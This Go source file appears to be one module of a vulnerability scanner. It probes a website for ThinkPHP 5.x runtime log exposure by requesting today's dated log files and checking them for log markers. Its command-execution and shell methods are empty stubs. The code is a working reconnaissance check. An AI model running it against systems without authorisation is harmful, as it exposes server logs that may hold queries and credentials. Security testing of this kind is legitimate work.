package thinkphp

import (
	"breach/internal/util"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type TP5LogModule struct {
	BaseUrl    string
	feature    string
	checkStr   string
	checkError string
}

func (t *TP5LogModule) CheckVul() *util.Response {
	now := time.Now()
	year := now.Year()
	month := now.Month()
	day := now.Day()
	payloadUrls := []string{
		fmt.Sprintf("%s/runtime/log/%d%02d/%02d.log", t.BaseUrl, year, month, day),
		fmt.Sprintf("%s/runtime/log/%d%02d/%02d_cli.log", t.BaseUrl, year, month, day),
		fmt.Sprintf("%s/runtime/log/%d%02d/%02d_error.log", t.BaseUrl, year, month, day),
		fmt.Sprintf("%s/runtime/log/%d%02d/%02d_sql.log", t.BaseUrl, year, month, day),
	}
	for _, payloadUrl := range payloadUrls {
		resp, err := http.Get(payloadUrl)
		if err != nil {
			return util.Fail(err.Error())
		}
		bytes, err := io.ReadAll(resp.Body)
		if err != nil {
			return util.Fail(err.Error())
		}
		if strings.Contains(string(bytes), t.checkStr) || strings.Contains(string(bytes), t.checkError) {
			return util.Success(t.feature, payloadUrl)
		}
	}
	return util.Fail("no vulnerable")
}

func (t *TP5LogModule) ExecVul(cmd string) *util.Response {
	return util.Fail("no vulnerable")
}

func (t *TP5LogModule) GetShell() *util.Response {
	return util.Fail("no vulnerable")
}

func NewTP5LogModule(baseUrl string) *TP5LogModule {
	return &TP5LogModule{
		BaseUrl:    baseUrl,
		feature:    "ThinkPHP 5.x 日志泄露",
		checkStr:   "[ info ]",
		checkError: "[ error ]",
	}
}
